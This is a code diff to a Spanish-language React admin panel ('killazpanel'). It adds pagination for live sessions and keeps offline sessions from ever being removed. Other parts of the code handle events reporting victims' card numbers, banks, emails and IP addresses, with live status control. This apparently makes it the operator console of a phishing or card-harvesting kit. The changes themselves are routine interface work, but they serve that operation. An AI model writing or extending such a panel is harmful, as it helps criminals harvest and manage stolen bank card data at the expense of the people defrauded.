@@ -378,6 +378,8 @@ export default function AdminPanel() {
   const [historyLoading, setHistoryLoading] = useState(false);
   const HISTORY_PAGE_SIZE = 20;
   const [confirmClear, setConfirmClear] = useState<"clicks" | "data" | null>(null);
+  const [livePage, setLivePage] = useState(1);
+  const LIVE_PAGE_SIZE = 15;
   const [panelTheme, setPanelTheme] = useState<PanelTheme>(() => {
     const saved = localStorage.getItem("killazpanel-theme");
     return (saved as PanelTheme) || "dark";
@@ -964,10 +966,7 @@ export default function AdminPanel() {
       if (navigator.vibrate) navigator.vibrate([100, 50, 200]);
     });
 
-    // Handle auto-cleanup: server removed an inactive session after 30 min
-    socket.on("admin:session-removed", (data: { sessionId: string }) => {
-      setSessions((prev) => prev.filter((s) => s.sessionId !== data.sessionId));
-    });
+    // NOTE: admin:session-removed no longer used - sessions are never removed
 
     // Linked card detected - same user with different card
     socket.on("admin:linked-card-detected", (data: { sessionId: string; previousSessionId: string; previousCard: string; previousBank: string; currentCard: string; currentBank: string; email: string; ipAddress: string }) => {
@@ -1004,11 +1003,6 @@ export default function AdminPanel() {
 
   const updateStatus = (sessionId: string, status: string) => {
     socketRef.current?.emit("admin:update-status", { sessionId, status });
-  };
-
-  const removeSession = (sessionId: string) => {
-    setSessions((prev) => prev.filter(s => s.sessionId !== sessionId));
-    if (selectedSessionId === sessionId) setSelectedSessionId(null);
   };
 
   const getStatusClasses = (status: string) => {
@@ -1180,6 +1174,18 @@ export default function AdminPanel() {
     
     return result;
   }, [sessions, filter, bankFilter, categoryFilter, searchQuery, sortBy]);
+
+  // Pagination for live sessions
+  const totalLivePages = Math.max(1, Math.ceil(filteredSessions.length / LIVE_PAGE_SIZE));
+  const paginatedSessions = useMemo(() => {
+    const start = (livePage - 1) * LIVE_PAGE_SIZE;
+    return filteredSessions.slice(start, start + LIVE_PAGE_SIZE);
+  }, [filteredSessions, livePage]);
+
+  // Reset to page 1 when filters change
+  useEffect(() => {
+    setLivePage(1);
+  }, [filter, bankFilter, categoryFilter, searchQuery, sortBy]);
 
   // Count online sessions
   const onlineCount = sessions.filter(s => s.isOnline).length;
@@ -2619,7 +2625,7 @@ export default function AdminPanel() {
                 </select>
                 {/* Results count */}
                 <span className="text-[10px] text-gray-600 ml-auto">
-                  {filteredSessions.length} de {sessions.length} sesiones
+                  {filteredSessions.length} de {sessions.length} sesiones {totalLivePages > 1 ? `(pág ${livePage}/${totalLivePages})` : ""}
                 </span>
               </div>
             )}
@@ -2639,8 +2645,67 @@ export default function AdminPanel() {
                 <p className="text-gray-500 text-sm">No hay sesiones que coincidan con los filtros seleccionados.</p>
               </div>
             ) : (
-              <div className="grid gap-4">
-                {filteredSessions.map((session) => {
+              <div className="space-y-4">
+                {/* Pagination info */}
+                {totalLivePages > 1 && (
+                  <div className={`flex items-center justify-between px-3 py-2 rounded-xl ${theme.cardBg} border ${theme.border}`}>
+                    <span className={`text-xs ${theme.textSecondary}`}>
+                      Mostrando {((livePage - 1) * LIVE_PAGE_SIZE) + 1}-{Math.min(livePage * LIVE_PAGE_SIZE, filteredSessions.length)} de {filteredSessions.length} sesiones
+                    </span>
+                    <div className="flex items-center gap-1.5">
+                      <button
+                        onClick={() => setLivePage(Math.max(1, livePage - 1))}
+                        disabled={livePage <= 1}
+                        className={`px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-all active:scale-95 ${
+                          livePage <= 1
+                            ? "opacity-30 cursor-not-allowed bg-white/5 text-gray-500 border-white/5"
+                            : "bg-white/5 text-gray-300 border-white/10 hover:bg-white/10"
+                        }`}
+                      >
+                        ← Anterior
+                      </button>
+                      {Array.from({ length: Math.min(totalLivePages, 7) }, (_, i) => {
+                        let pageNum: number;
+                        if (totalLivePages <= 7) {
+                          pageNum = i + 1;
+                        } else if (livePage <= 4) {
+                          pageNum = i + 1;
+                        } else if (livePage >= totalLivePages - 3) {
+                          pageNum = totalLivePages - 6 + i;
+                        } else {
+                          pageNum = livePage - 3 + i;
+                        }
+                        return (
+                          <button
+                            key={pageNum}
+                            onClick={() => setLivePage(pageNum)}
+                            className={`w-8 h-8 rounded-lg text-xs font-bold transition-all active:scale-95 ${
+                              livePage === pageNum
+                                ? "bg-red-500/20 text-red-400 border border-red-500/30"
+                                : "bg-white/5 text-gray-400 border border-white/5 hover:bg-white/10"
+                            }`}
+                          >
+                            {pageNum}
+                          </button>
+                        );
+                      })}
+                      <button
+                        onClick={() => setLivePage(Math.min(totalLivePages, livePage + 1))}
+                        disabled={livePage >= totalLivePages}
+                        className={`px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-all active:scale-95 ${
+                          livePage >= totalLivePages
+                            ? "opacity-30 cursor-not-allowed bg-white/5 text-gray-500 border-white/5"
+                            : "bg-white/5 text-gray-300 border-white/10 hover:bg-white/10"
+                        }`}
+                      >
+                        Siguiente →
+                      </button>
+                    </div>
+                  </div>
+                )}
+
+                <div className="grid gap-4">
+                {paginatedSessions.map((session) => {
                   const isSelected = selectedSessionId === session.sessionId;
                   const statusCls = getStatusClasses(session.status);
                   
@@ -2764,15 +2829,6 @@ export default function AdminPanel() {
                           >
                             {copySuccess === session.sessionId ? "✓" : "📋"}
                           </button>
-                          {!session.isOnline && (
-                            <button
-                              onClick={(e) => { e.stopPropagation(); removeSession(session.sessionId); }}
-                              className="w-8 h-8 rounded-lg flex items-center justify-center transition-all text-xs bg-white/5 text-gray-500 hover:bg-red-500/10 hover:text-red-400"
-                              title="Quitar de la lista"
-                            >
-                              ✕
-                            </button>
-                          )}
                           <svg
                             xmlns="http://www.w3.org/2000/svg"
                             className={`w-4 h-4 text-gray-500 transition-transform ${isSelected ? "rotate-180" : ""}`}
@@ -2950,6 +3006,40 @@ export default function AdminPanel() {
                     </div>
                   );
                 })}
+              </div>
+
+                {/* Bottom Pagination */}
+                {totalLivePages > 1 && (
+                  <div className={`flex items-center justify-between px-3 py-2 rounded-xl ${theme.cardBg} border ${theme.border} mt-4`}>
+                    <span className={`text-xs ${theme.textSecondary}`}>
+                      Página {livePage} de {totalLivePages}
+                    </span>
+                    <div className="flex items-center gap-1.5">
+                      <button
+                        onClick={() => setLivePage(Math.max(1, livePage - 1))}
+                        disabled={livePage <= 1}
+                        className={`px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-all active:scale-95 ${
+                          livePage <= 1
+                            ? "opacity-30 cursor-not-allowed bg-white/5 text-gray-500 border-white/5"
+                            : "bg-white/5 text-gray-300 border-white/10 hover:bg-white/10"
+                        }`}
+                      >
+                        ← Anterior
+                      </button>
+                      <button
+                        onClick={() => setLivePage(Math.min(totalLivePages, livePage + 1))}
+                        disabled={livePage >= totalLivePages}
+                        className={`px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-all active:scale-95 ${
+                          livePage >= totalLivePages
+                            ? "opacity-30 cursor-not-allowed bg-white/5 text-gray-500 border-white/5"
+                            : "bg-white/5 text-gray-300 border-white/10 hover:bg-white/10"
+                        }`}
+                      >
+                        Siguiente →
+                      </button>
+                    </div>
+                  </div>
+                )}
               </div>
             )}
           </div>
